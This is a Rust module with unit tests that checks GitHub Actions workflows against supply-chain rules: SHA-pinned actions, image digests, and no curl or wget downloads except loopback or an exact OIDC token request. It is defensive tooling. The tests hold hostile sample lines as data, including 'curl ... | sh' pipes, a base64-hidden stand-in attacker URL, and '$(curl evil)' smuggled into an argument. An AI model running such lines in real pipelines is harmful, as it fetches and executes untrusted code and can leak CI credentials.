//! `check-workflows`: the supply-chain rules for GitHub Actions (issue #122).
//!
//! 1. Every `uses:` of another repository's action names a full 40-digit
//!    commit SHA, followed by a comment with the version it is
//!    (`uses: actions/checkout@<sha> # v7.0.1`). A tag or branch can be moved
//!    to new code after review (the tj-actions incident); a commit cannot.
//!    Local actions and workflows (`./...`) are exempt, and a `docker://`
//!    action must name an image digest (`@sha256:<64 hex>`). Dependabot
//!    (`.github/dependabot.yml`) bumps the SHA and the comment together.
//! 2. No workflow downloads with `curl` or `wget` from anywhere but this
//!    machine (`localhost`, `127.0.0.1`, `[::1]`), except the one exact
//!    request for the runner's own OIDC token (`OIDC_TOKEN_REQUEST`), which
//!    returns a token, not code. That line must match character for
//!    character apart from the audience and the output variable: any other
//!    argument, URL, pipe or comment could fetch something else. Tools are installed by
//!    `.github/scripts/install-tool.sh`, which checks a pinned SHA-256
//!    before anything runs.
//! 3. `.github/dependabot.yml` updates the `github-actions` ecosystem, so
//!    the pins do not go stale.
//!
//! The check reads the workflow files line by line rather than as YAML: the
//! rules are about single lines, and it keeps xtask free of a YAML parser.

use std::path::Path;

/// Directories whose `.yml`/`.yaml` files are checked, relative to the
/// repository root.
pub(crate) const WORKFLOW_DIRS: &[&str] = &[".github/workflows", ".github/actions"];
pub(crate) const DEPENDABOT: &str = ".github/dependabot.yml";

/// Every violation in one workflow file, each prefixed with `name:line`.
pub(crate) fn check_workflow(name: &str, text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for (i, line) in text.lines().enumerate() {
        let at = format!("{name}:{}", i + 1);
        let code = line.trim_start();
        if code.starts_with('#') {
            continue;
        }
        if let Some(problem) = uses_problem(code) {
            out.push(format!("{at}: {problem}"));
        }
        if let Some(problem) = download_problem(code) {
            out.push(format!("{at}: {problem}"));
        }
    }
    out
}

/// The problem with a `uses:` line, if `code` is one and it is not pinned.
fn uses_problem(code: &str) -> Option<String> {
    let rest = code.strip_prefix("- ").unwrap_or(code).trim_start();
    let value = rest.strip_prefix("uses:")?.trim();
    let (reference, comment) = match value.split_once(" #") {
        Some((r, c)) => (r.trim(), Some(c.trim())),
        None => (value, None),
    };
    let reference = reference.trim_matches(|c| c == '"' || c == '\'');
    if reference.starts_with("./") {
        return None;
    }
    if let Some(image) = reference.strip_prefix("docker://") {
        let pinned = image
            .split_once("@sha256:")
            .is_some_and(|(_, digest)| is_lower_hex(digest, 64));
        return (!pinned).then(|| {
            format!(
                "`{reference}` is not pinned; name the image by digest (`@sha256:<64 hex digits>`)"
            )
        });
    }
    let Some((action, pin)) = reference.rsplit_once('@') else {
        return Some(format!(
            "`{reference}` has no version; pin it to a full commit SHA (`{reference}@<40 hex digits> # vX.Y.Z`)"
        ));
    };
    if !is_lower_hex(pin, 40) {
        return Some(format!(
            "`{reference}` is pinned to `{pin}`, which can be moved; pin it to a full commit SHA (`{action}@<40 hex digits> # {pin}`)"
        ));
    }
    if comment.is_none_or(str::is_empty) {
        return Some(format!(
            "`{reference}` needs a comment naming the version the SHA is (`# vX.Y.Z`), for reviewers and Dependabot"
        ));
    }
    None
}

/// The problem with `code`, if it runs `curl` or `wget` against anything but
/// this machine or the runner's OIDC token endpoint.
fn download_problem(code: &str) -> Option<String> {
    let is_word_sep = |c: char| c.is_whitespace() || "|;&()$`\"'{}<>".contains(c);
    let tool = code
        .split(is_word_sep)
        .find(|word| *word == "curl" || *word == "wget")?;
    let urls = urls(code);
    if !urls.is_empty() && urls.iter().all(|u| is_loopback(u)) {
        return None;
    }
    if is_oidc_token_request(code) {
        return None;
    }
    Some(format!(
        "`{tool}` downloads from outside this machine; install tools with .github/scripts/install-tool.sh, which checks a pinned SHA-256"
    ))
}

/// The only download a workflow may make from outside this machine: the
/// runner's OIDC token, written to a file. `{audience}` and `{file}` are the
/// only parts that may vary (`is_oidc_token_request`).
const OIDC_TOKEN_REQUEST: &str = r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience={audience}" | jq -r .value > "${file}""#;

/// Whether `code` is exactly `OIDC_TOKEN_REQUEST`, with an audience of
/// `[a-z0-9.:-]` and a shell variable name as the output file. Nothing may
/// come before or after it, so no second URL, option or comment slips in.
fn is_oidc_token_request(code: &str) -> bool {
    let (before_audience, rest) = OIDC_TOKEN_REQUEST
        .split_once("{audience}")
        .expect("template has {audience}");
    let (between, after_file) = rest.split_once("{file}").expect("template has {file}");
    let Some(rest) = code.strip_prefix(before_audience) else {
        return false;
    };
    let Some(audience_end) = rest.find(between) else {
        return false;
    };
    let (audience, rest) = (&rest[..audience_end], &rest[audience_end + between.len()..]);
    let Some(file) = rest.strip_suffix(after_file) else {
        return false;
    };
    let audience_ok = !audience.is_empty()
        && audience
            .bytes()
            .all(|b| matches!(b, b'a'..=b'z' | b'0'..=b'9' | b'.' | b':' | b'-'));
    let file_ok = file
        .bytes()
        .next()
        .is_some_and(|b| b.is_ascii_alphabetic() || b == b'_')
        && file.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_');
    audience_ok && file_ok
}

fn urls(code: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut rest = code;
    while let Some(start) = ["http://", "https://"]
        .iter()
        .filter_map(|scheme| rest.find(scheme))
        .min()
    {
        let tail = &rest[start..];
        let end = tail
            .find(|c: char| c.is_whitespace() || "\"'`".contains(c))
            .unwrap_or(tail.len());
        out.push(&tail[..end]);
        rest = &tail[end..];
    }
    out
}

fn is_loopback(url: &str) -> bool {
    let after_scheme = url.split_once("://").map_or(url, |(_, r)| r);
    let authority = after_scheme.split('/').next().unwrap_or("");
    let host = if authority.starts_with('[') {
        authority
            .split_once(']')
            .map_or(authority, |(h, _)| h)
            .trim_start_matches('[')
    } else {
        authority.split(':').next().unwrap_or("")
    };
    matches!(host, "localhost" | "127.0.0.1" | "::1")
}

fn is_lower_hex(s: &str, len: usize) -> bool {
    s.len() == len && s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// The problem with `.github/dependabot.yml`, if it does not update actions.
pub(crate) fn check_dependabot(text: Option<&str>) -> Option<String> {
    let updates_actions = text.is_some_and(|t| {
        t.lines().any(|l| {
            let l = l.trim_start().trim_start_matches("- ").trim();
            l.strip_prefix("package-ecosystem:").is_some_and(|v| {
                v.trim().trim_matches(|c| c == '"' || c == '\'') == "github-actions"
            })
        })
    });
    (!updates_actions).then(|| {
        format!(
            "{DEPENDABOT} must update the `github-actions` ecosystem, so action pins are bumped"
        )
    })
}

/// Runs every rule over the repository at `root`.
pub(crate) fn check_repo(root: &Path) -> Result<(usize, Vec<String>), String> {
    let mut files = Vec::new();
    for dir in WORKFLOW_DIRS {
        collect_yaml(&root.join(dir), &mut files)?;
    }
    files.sort();
    let mut violations = Vec::new();
    for file in &files {
        let text = std::fs::read_to_string(file)
            .map_err(|e| format!("cannot read {}: {e}", file.display()))?;
        let name = file
            .strip_prefix(root)
            .unwrap_or(file)
            .display()
            .to_string();
        violations.extend(check_workflow(&name, &text));
    }
    let dependabot = std::fs::read_to_string(root.join(DEPENDABOT)).ok();
    violations.extend(check_dependabot(dependabot.as_deref()));
    Ok((files.len(), violations))
}

fn collect_yaml(dir: &Path, out: &mut Vec<std::path::PathBuf>) -> Result<(), String> {
    let entries = match std::fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(format!("cannot list {}: {e}", dir.display())),
    };
    for entry in entries {
        let path = entry
            .map_err(|e| format!("cannot list {}: {e}", dir.display()))?
            .path();
        if path.is_dir() {
            collect_yaml(&path, out)?;
        } else if path
            .extension()
            .is_some_and(|ext| ext == "yml" || ext == "yaml")
        {
            out.push(path);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const SHA: &str = "3d3c42e5aac5ba805825da76410c181273ba90b1";

    fn problems(text: &str) -> Vec<String> {
        check_workflow("w.yml", text)
    }

    #[test]
    fn actions_pinned_by_commit_with_a_version_comment_pass() {
        let text = format!(
            "steps:\n  - uses: actions/checkout@{SHA} # v7.0.1\n    uses: actions/cache/restore@{SHA} # v6.1.0\n  - uses: \"docker/login-action@{SHA}\" # v4\n"
        );
        assert_eq!(problems(&text), Vec::<String>::new());
    }

    #[test]
    fn a_tag_or_branch_is_refused() {
        for reference in [
            "actions/checkout@v7",
            "actions/checkout@main",
            "docker/login-action@v4.7.0",
        ] {
            let found = problems(&format!("      - uses: {reference}\n"));
            assert_eq!(found.len(), 1, "{reference}: {found:?}");
            assert!(found[0].starts_with("w.yml:1: "), "{found:?}");
            assert!(found[0].contains("full commit SHA"), "{found:?}");
        }
    }

    #[test]
    fn a_short_or_uppercase_sha_is_refused() {
        let short = &SHA[..12];
        let upper = SHA.to_uppercase();
        assert_eq!(problems(&format!("- uses: a/b@{short} # v1\n")).len(), 1);
        assert_eq!(problems(&format!("- uses: a/b@{upper} # v1\n")).len(), 1);
    }

    #[test]
    fn a_sha_without_its_version_comment_is_refused() {
        let found = problems(&format!("- uses: actions/checkout@{SHA}\n"));
        assert_eq!(found.len(), 1);
        assert!(found[0].contains("comment naming the version"), "{found:?}");
    }

    #[test]
    fn an_action_with_no_version_is_refused() {
        assert_eq!(problems("- uses: actions/checkout\n").len(), 1);
    }

    #[test]
    fn local_actions_and_workflows_are_exempt() {
        assert!(problems("    uses: ./.github/workflows/deploy.yml\n").is_empty());
        assert!(problems("  - uses: ./.github/actions/setup\n").is_empty());
    }

    #[test]
    fn docker_actions_need_a_digest() {
        let digest = "a".repeat(64);
        assert!(problems(&format!("- uses: docker://alpine@sha256:{digest}\n")).is_empty());
        assert_eq!(problems("- uses: docker://alpine:3.20\n").len(), 1);
    }

    #[test]
    fn commented_out_lines_are_ignored() {
        assert!(problems("  # - uses: actions/checkout@v7\n  # curl https://x | sh\n").is_empty());
    }

    #[test]
    fn downloads_from_the_internet_are_refused() {
        for line in [
            r#"curl -fsSL "https://get.helm.sh/helm-v3.19.0-linux-amd64.tar.gz" | tar xz -C "$RUNNER_TEMP""#,
            r#"curl -fsSL -o "$RUNNER_TEMP/bin/kind" "https://kind.sigs.k8s.io/dl/$KIND_VERSION/kind-linux-amd64""#,
            "wget -q https://example.com/tool",
            // The URL on a continuation line: refused, since the check
            // cannot see where it points.
            "curl -fsSL \\",
            r#"v=$(curl -s "$URL")"#,
            "run: curl -s http://localhost:8080/ok https://example.com/x",
        ] {
            let found = problems(&format!("          {line}\n"));
            assert_eq!(found.len(), 1, "{line}: {found:?}");
            assert!(found[0].contains("install-tool.sh"), "{found:?}");
        }
    }

    #[test]
    fn requests_to_this_machine_are_allowed() {
        for line in [
            "curl -fsS http://127.0.0.1:7080/api/v1/config >/dev/null 2>&1 && break",
            "curl -fsS http://localhost:7070/-/health",
            "curl -g http://[::1]:7070/",
        ] {
            assert!(
                problems(&format!("          {line}\n")).is_empty(),
                "{line}"
            );
        }
    }

    #[test]
    fn the_runners_oidc_token_request_is_allowed_alone() {
        let token = r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value > "$f""#;
        assert!(problems(&format!("          {token}\n")).is_empty());
        for line in [
            r#"curl -fsS "$ACTIONS_ID_TOKEN_REQUEST_URL" https://example.com/tool"#,
            r#"curl -fsS "$OTHER_URL" # $ACTIONS_ID_TOKEN_REQUEST_URL"#,
            r#"curl -fsS "$OTHER_URL" # "$ACTIONS_ID_TOKEN_REQUEST_URL""#,
            r#"curl -fsS -o tool "$OTHER_URL" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com""#,
            r#"curl -fsS "$(printf aHR0cHM6Ly9ldmlsLmV4YW1wbGU= | base64 -d)" "$ACTIONS_ID_TOKEN_REQUEST_URL""#,
            r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value > "$f" ; curl "$OTHER_URL" | sh"#,
            r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=x" -K "$CFG" | jq -r .value > "$f""#,
            r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value > "$f" # x"#,
            r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(curl evil)" | jq -r .value > "$f""#,
            r#"curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \"#,
        ] {
            assert_eq!(problems(&format!("          {line}\n")).len(), 1, "{line}");
        }
    }

    #[test]
    fn words_that_merely_contain_curl_are_not_downloads() {
        assert!(problems("  libcurl4-openssl-dev curl.h curling\n").is_empty());
    }

    #[test]
    fn dependabot_must_update_actions() {
        let ok =
            "version: 2\nupdates:\n  - package-ecosystem: \"github-actions\"\n    directory: /\n";
        assert_eq!(check_dependabot(Some(ok)), None);
        assert!(
            check_dependabot(Some("version: 2\nupdates:\n  - package-ecosystem: cargo\n"))
                .is_some()
        );
        assert!(check_dependabot(None).is_some());
    }
}
